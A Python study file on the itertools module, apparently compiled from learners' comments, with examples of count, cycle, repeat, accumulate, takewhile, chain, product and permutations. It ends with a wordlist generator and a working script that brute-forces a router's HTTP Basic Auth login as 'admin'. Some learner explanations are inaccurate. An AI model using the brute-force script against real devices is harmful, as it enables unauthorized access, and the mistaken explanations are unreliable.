# SECTION 1
# The module itertools is a standard library that contains several functions that are useful in functional programming.
# One type of function it produces is infinite iterators.
# The function count counts up infinitely from a value.
# The function cycle infinitely iterates through an iterable (for instance a list or string).
# The function repeat repeats an object, either infinitely or a specific number of times.
# Example:
from itertools import count

for i in count(3):
    print(i)
    if i >=11:
        break
#

# Good to add at this point (as this might actually come in handy) that count has two arguments: 
# count(x, y) where x is a start value and y is the increment/decrement pace (with y being a positive or negative number, respectively). 
# So count(4, 5) will produce: 4 9 14 19 24 . . . whereas count(20, -3) will give us: 20 17 14 11

# Example:
from itertools import repeat 
# Gimme a list which has "Seinfeld" string 5 times 
print(list(repeat("Seinfeld", 5))) 
# Gimme a list with number 77 appearing 5 times 
print(list(repeat(77, 5))) 
# give a list with INFINITE times "Seinfeld" string appearing 
# KILL program ASAP to save urself 
print(list(repeat("Seinfeld"))) # ['Seinfeld', 'Seinfeld', 'Seinfeld', 'Seinfeld', 'Seinfeld'] [77, 77, 77, 77, 77]


# Examples: Small examples of three functions of itertools: 
# 1. Count 2. Cycle 3. Repeat 
# Count Example: (prints numbers 3 to 5) 
for i in count(3): 
  print(i) 
  if i>5: 
    break         # 3 4 5 
# 
# Cycle Example: (prints mylist few times)
mylist=[1,2,3,4,5] 
for i in cycle(mylist): 
  print(mylist) 
  if i>3: 
    break         # [1, 2, 3, 4, 5] [1, 2, 3, 4, 5] [1, 2, 3, 4, 5] [1, 2, 3, 4, 5] 
#                    
# Repeat Example: 
mylist=[1,2,3,4,5] 
print(list(repeat(mylist,3))) # [[1, 2, 3, 4, 5], [1, 2, 3, 4, 5], [1, 2, 3, 4, 5]] 
mylist=['apple','milk','jiuce']
counter = 0
for each_element in cycle(mylist):
  counter += 1
  print(counter, each_element)
  if counter == 10:
    break           # 1 apple 2 milk 3 jiuce 4 apple 5 milk 6 jiuce 7 apple 8 milk 9 jiuce 10 apple 
#
# Note: the point to note is without the "cycle" keyword in the for loop, 
# the loop will stop looping when it reaches the end of list, 
# however, becoz of "cycle" function, it reloops from beginning again, until coun


# Example: Same behaviour can be achieved with a generator like below: 
def count(start, step=1): 
    i = start 
    while True: 
        yield i 
        i += step 

for x in count(3):
    print(x)
    if x >= 11:
        break 
#


# Example:
from itertools import count
for i in count(3,0.55):
    print(i)
    if i >=11:
        break   
# 

# for what reason we need to use count. count(start, step) Ok... but we using for. 
# So... what the real difference with range? range(start, stop, step) 
# Only because it can counting for infinite? Or because range default is stop and count default is start? 
# From my point of view it's little useless function. And if we need infinite count we can use generator. 
# So. Can someone give me a good reason to use count?

# from itertools import repeat p=0 for i in repeat(3): p=p+1 print(i) if p>=11: break

# same output with the following code. 
from itertools import count 
for i in count(3): 
    if i <= 11: 
        print(i)
#

# https://docs.python.org/3/library/itertools.html

# Example:
for i in repeat(5,9): 
    print(i) # output :- 5 5 5 5 5 5 5 5 5 "nine fives"
#

# This could be a useful reference as we change gears and move from Functional Programming to Object Oriented Programming in the next module. 
# It also links to itertools. https://docs.python.org/3/howto/functional.html
  
# Same code can be written with Range function. 
for i in range(3,12): 
    print(i)
# 

# Example: To import the cycle function from the itertools module.
from itertools import cycle             # from (module name) import (function name)             # Modules are in libraries

# Example:
for i in "python": 
    print(i)
# The above code outputs just the following: p y t h o n 
# now try cycle infinitely from itertools import cycle for i in cycle("python"): print(i) 
# Output: p y t h o n p y t h o n  still doing printing infinitely that could be useful 
# especially if u used break like you define a variable = 0 
# and u increase the variable with every t in python and when it hits number of repeats you break the for loop
# wish that helped you understanding the difference
# or in something like stop=0 for i in cycle("python"): print(i) if stop ==8: break stop =stop+1

# In english readability, this code would mean : 
# *from* the library itertools, 
# *import* a function called 'cycle' into my library/code.


# Answer: from itertools import cycle 
# As They Have Said to Only import "cycle" class/function from the itertools module... 
# importing all function/classes will be: from itertools import * OR, import itertools 
# Format: import {module-name} or from {module-name} import {class/function}


# SECTION 2
# There are many functions in itertools that operate on iterables, in a similar way to map and filter.
# Some examples:
# takewhile - takes items from an iterable while a predicate function remains true;
# chain - combines several iterables into one long one;
# accumulate - returns a running total of values in an iterable. 
# Example:
from itertools import accumulate, takewhile

nums = list(accumulate(range(8)))
print(nums)                                     # [0, 1, 3, 6, 10, 15, 21, 28]
print(list(takewhile(lambda x: x<= 6, nums)))   # [0, 1, 3, 6]
# 0+1, 1+2, 3+3, 6+4, 10+5, 15+6, 21+7, 28+8    # Total + NextSequenceInRange

# accumulate goes like this:
# if 0 is there, add numbers up to 0(0+0=0) 
# if 1 is there, add numbers up to 1(0+1=1) 
# if 2 is there, add numbers up to 2(0+1+2=3) 
# if 3 is there, add numbers up to 3(0+1+2+3=6) 
# if 4 is there, add numbers up to 4(0+1+2+3+4=10) and so on

# Example:
print(list(chain([1,3,2], [3,5,9]))) 
print(list(chain(["man","nan"], ["pan"]))) # output: [1, 3, 2, 3, 5, 9] ['man', 'nan', 'pan'] just to illustrate an example of the CHAIN function

# Difference between filter and takewhile is that filter takes all the elements which satisfy the predicate function 
# while takewhile will stop taking elements the moment an element doesn't satisfy the predicate function

# A way to help you understand lessons and improve your problem solving skills is to read the program and its results, 
# then type out the program yourself and go over it line by line. 
# Why does it print what it prints? in this case: nums = list(accumulate(range(8))) 
# nums holds the value list(accumulate(range(8))) 
# list is telling it to print in list form (i.e. in brackets []) 
# accumulate is saying that it is going to return the individual values add to it's predecessor one at a time 
# range is just limiting it to remain in the range of 8 (i.e. 0-7) 
# print(nums) will produce: >>> [0, 1, 3, 6, 10, 15, 21, 28] 
# Breakdown: 
# range = 0, 1, 2, 3, 4, 5, 6, 7 
# so 0=0, 1+0=1, 2+1=3, 3+3=6, 4+6=10, 5+10=15, 6+15=21, 7+21=28 
# it moves through the range one at a time ACCUMULATING as it processes. 
# print(list(takewhile(lambda x: x<= 6, nums))) 
# x is the placeholder for nums """ 
# it will take the result of nums printed and print the sequence as long as the output is equal to or less than 6. 
# the lambda is our parameter to set

# Example: 
from itertools import takewhile,chain 
mylist = [0,1,3,6,10,15,2,1] 
print(mylist) # [0, 1, 3, 6, 10, 15, 2, 1]
a = lambda x:x<=6 
tw = list(takewhile(a,mylist)) 
fl = list(filter(a,mylist)) 
ch = list(chain(tw,fl)) 
print(tw)   # [0, 1, 3, 6]
print(fl)   # [0, 1, 3, 6, 2, 1]
print(ch)   # [0, 1, 3, 6, 0, 1, 3, 6, 2, 1] 


# the difference between takewhile and filter 
# filter goes through all the elements of the iterabele takewhile checks the condition as long as it is True. 
# when it hit False, it exits the iterable.

# print(list(takewhile(lambda x: x<=6, nums))) 
# This takes the values of nums and puts them into the variable x one at a time. 
# For the values that result in the expression being true it prints the value in a list.

# takewhile-get the values of the sequence, until the value of the predicate function for its elements is true; 
# dropwhile-receiving sequence values starting with an element for which the value of the predicate function will cease to be true. 
# From itertools import takewhile, dropwhile Numbers = [1, 5, 8, 5, 1] Predicate = lambda x: x <6 For value in takewhile (predicate, numbers): 
# Print (value) Print () For value in dropwhile (predicate, numbers): Print (value) Output >>> 1 >>> 5 >>> 8 >>> 5 >>> 1


# I found some facts about takewhile function. 
# I experimented with four operators(<, <=, >, >=) and those working normally in 'takewhile' were < and <=. 
# I think it's because the iteration process starts with the first element. 
# So if the first element doesn't satisfy the predicate function, it won't start any iteration. Hence all you can see is an empty list. 
# However, this is not the case when the condition changes. 
# If you change <= to > and 6 to -1 in this example, you will see the whole list. 
# In conclusion, all four operators are valid in takewhile function. 
# But what makes the output valid is whether the predicate function is satisfied or not.

# Idk why an example of chain is not shown on the lesson, but here it goes: 
from itertools import accumulate, takewhile, chain 
nums = list(accumulate(range(8))) 
print(nums)                                                                 # [0, 1, 3, 6, 10, 15, 21, 28]
print(list(takewhile(lambda x: x<= 6, nums)))                               # [0, 1, 3, 6] 
print(list(chain(accumulate(range(8)),takewhile(lambda x: x<= 6, nums))))   # [0, 1, 3, 6, 10, 15, 21, 28, 0, 1, 3, 6] 


# Example:
from itertools import accumulate 
def sigma(n): 
# Returns sum of integers from 0 to n
    if n == 0: 
        return 0 
    return n + sigma(n-1) 

lst1 = [sigma(i) 
for i in range(8)] 
lst2 = list(accumulate(range(8))) 
print(lst1 == lst2) # True

# range(8) = 0,1,2,3,4,5,6,7 
# accumulate = 0,0+1,0+1+2,0+1+2+3,0+1+2+3+4,0+1+2+3+4+5,0+1+2+3+4+5+6,0+1+2+3+4+5+6+7


# Example:  to take the numbers from the list while they are even, using the takewhile function.
from itertools import takewhile

nums = [2, 4, 6, 7, 9, 8]

a = takewhile(lambda x: x%2==0, nums)       # Lambda: It's just a faster way to define a simple function in one line. 
print(list(a))  # [2, 4, 6]

# The code below is basically (lambda x: x%2==0, nums) --> the same as this def check_even(x) x%2==0 return x check_even(nums) 
# it is to check and keep the even integers 
# Why is the output not [2, 4, 6, 8]? 
# The takewhile command will stop when it reaches the element that is not divisible by 2 to produce 0, 
# in this case the input is: nums = [2, 4, 6, 7, 9, 8] 
# it will stop at the 3rd element which is the integer 
# Unless the command is filter which will filter out all elements divisible by 2 to produce 0, and the output will be: [2, 4, 6, 8]


# Example:
# To understand takewhile function you must see this: 
nums = [2, 4, 6, 7, 9, 8] 
a = filter(lambda x: x%2==0, nums) 
print(list(a)) # [2,4,6,8] 
# But with takewhile 
from itertools import takewhile 
nums = [2, 4, 6, 7, 9, 8] 
a =takewhile(lambda x: x%2==0, nums)
print(list(a)) # [2,4,6] 
# takewhile function when see "7" number, it breaks. so you can see the difference between "filter" and "takewhile".

# It seems the difference between filter and takewhile is that filter returns a list, 
# but takewhile returns an iterator, which must be cast to a list in order to print it.

# 8 is not in the output, because takewhile working while function remains true. 
# When function get 7, it remains false. And takewhile stop takes items.

# Takewhile function will take only till the function remains true, 
# as soon as function becomes false it turns itself off and doesn't checks further. 
# You can replace this "takewhile" function by "filter" function 
# if you don't need takewhile's carelessness in your code to abandon itself as soon as condition goes off.


# SECTION 3
# There are also several combinatoric functions in itertool, such as product and permutation.
# These are used when you want to accomplish a task with all possible combinations of some items.
# Example:
from itertools import product, permutations

letters = ("A", "B")
print(list(product(letters, range(2))))     # [('A', 0), ('A', 1), ('B', 0), ('B', 1)]
print(list(permutations(letters)))          # [('A', 'B'), ('B', 'A')]

# Itertools' permutation function may take two arguments, 
# where the first one is the collection of elements 
# to be permutated and the second is the number of elements each produced permutation has to have. 
# For example with three elements to be processed, you might want to end up with all one-element, 
# two-element or three-element permutations, respectively: 
from itertools import product, permutations 

letters = ("A", "B", "C") 
print(list(permutations(letters, 1)))   # [('A',), ('B',), ('C',)]
print(list(permutations(letters, 2)))   # [('A', 'B'), ('A', 'C'), ('B', 'A'), ('B', 'C'), ('C', 'A'), ('C', 'B')]
print(list(permutations(letters, 3)))   # [('A', 'B', 'C'), ('A', 'C', 'B'), ('B', 'A', 'C'), ('B', 'C', 'A'), ('C', 'A', 'B'), ('C', 'B', 'A')]

# Example:
# permutations() has a second parameter specifying what size group to permutate. 
# This example will explain: 
from itertools import permutations 
nums = (1, 2, 3) 
print(list(permutations(nums)))     # [(1, 2, 3), (1, 3, 2), (2, 1, 3), (2, 3, 1), (3, 1, 2), (3, 2, 1)] 
print(list(permutations(nums, 2)))  # [(1, 2), (1, 3), (2, 1), (2, 3), (3, 1), (3, 2)]

# The product() function takes each combination of listA and listB: 
from itertools import product 
listA = ['X', 'Y'] 
listB = [4, 2] 
print(list(product(listA,listB))) # [('X',4),('X',2),('Y',4),('Y',2)]

# For those familiar with set theory in math, the product function gives the Cartesian product of the two arguments. 
# This means it creates one new set by taking the first value from the first set, pairing it with every value from the second set, 
# and repeating the process with every other value from the first set. 
# The permutation function takes a list as its input and then outputs all the distinguishably different combinations of the values of that list. 
# Thus, the permutations of ABC are ABC, ACB, BAC, BCA, CAB, CBA.

# Let me try to give an illustrative explanation of the "product"-function. 
# We have two input arguments here: 
# (1) letters = ('A','B') 
# (2) range(2) giving us the values 0 and 1 
# Now take a look at the following table: 
# | 0 | 1 | <- values in 2nd arg. ---- A | A,0 | A,1 | - ---- |> possible combinations B | B,0 | B,1 | - ---- ^--- values in 1st argument 
# As you can see "product" just combines every value of the 1st argument with the values of the 2nd argument. 
# It does not compute any product between the values, as the name would suggest.

# Example:
from itertools import product, permutations ,combinations 
print(list(product(("X","Y","Z"),("M","N","O"))))   # [('X','M'),('X','N'),('X','O'),('Y','M'),('Y','N'),('Y','O'),('Z','M'),('Z','N'),('Z','O')]
print(list(combinations(("A","B","C") ,2)))         # [('A', 'B'), ('A', 'C'), ('B', 'C')]
print(list(permutations(("A","B","C"),2)))          # [('A', 'B'), ('A', 'C'), ('B', 'A'), ('B', 'C'), ('C', 'A'), ('C', 'B')]

# Product (to avoid nested for loops); A simple example From itertools import product 
# Nested LOOPS 
#for i in range (2): 
# for j in range (3): 
# print("{} * {} = {}" format (i, j, i * j)) 
# Product for a, b in product (range (2), range (3)): print("{} * {} = {}" format (a, b, a * b)) 
# In both cases, the output will be the same

# Permutations and combinations are not the same, for the first you care about the order and for the second you don't..

# Example: 
letters = ('A', 'B')                    # range index starts from 0 
print(list(product(letters,range(3))))  # [(A,0),(A,1),(A,2),(B,0),(B,1),(B,2)]


# Example:
from itertools import product
a={1, 2}
print(len(list(product(range(3), a))))      # 6
# It is 6 because of following combinations (0,1)(1,1)(2,1) and (0,2) (1,2) (2,2) 
# here it is (range,value) where range 0,1,2, and value is taken from num function that we provided 1,2

# Explanation:
a = [1,2] 
# Range calc 
print(list(range(3))) # [0,1,2] 
# Product calc 
print(list(product([0,1,2], [1,2] ))) # (0,1)(0,2)(1,1)(1,2)(2,1)(2,2) --> Return len # 6 --> the length of the list

# Explanation:
# len(list(product(range(3), a))) = 
# len(list(product((0,1,2), a))) = 
# len(list((0,1),(0,2),(1,1),(1,2),(2,1),(2,2))) = 
# len[(0,1),(0,2),(1,1),(1,2),(2,1),(2,2)] = 6



# Example: Word List Combinator - To create simple combination list. It will indicate "OS Error"
"""
Script generated "new_list" with possible combination values from "letters".
For creating combinations used function product() from module itertools. 
"""
# Import module
import itertools

# 'letters' can contain your needful words
letters = "1", "2", "3", "4", "5", "6", "7", "8", "9", "0"
n = 8 # lenght of generated values

# Creating wordlist
file = open("wordlist.txt", "w")

# Generate combinations and then write to "wordlist"
for wl in itertools.product(letters, repeat = n):
    file.write(''.join(wl) + "\n")
"""
Wordlist can be used for brute force. Check the code 'bruteForceRouter'.
"""

# Example: Brute Force Router
"""
This program taked passwords from your wordlist.txt 
and then try brute force router.
You can generate wordlist by using my code 'wordlistGenerator', check this ;)
"""
# Import 'requests' modules
from requests.auth import HTTPBasicAuth
import requests

# Open and read file and after get to list 'words'
file = open("wordlist.txt", "r")
words = [line.rstrip('\n') for line in file]

# In this case, using the function is optional
def hts():
    url = "http://192.168.0.1/" # Router local IP-adress
    name = "admin" # Name of administrator user
    
    for i in words: # Get start brute force every value..
        auth = HTTPBasicAuth(name,i) # 'i' is password from wordlist
        try:
            r = requests.get(url, auth=auth) # Try to get request from router using auth with pass 'i'
            if r:
                print("Success!\n" + "Password: " + i) # If password is correct, then stop brute force.
                break
            else:
                pass # If pass uncorrect, then go to checking next pass
        except:
            print("Some error.. :c")
    else:
        print("Combinations not founded!") # If wordlist doesn't contain correct pass :c
hts()

# If this was interesting for you, get "plus" on this code.



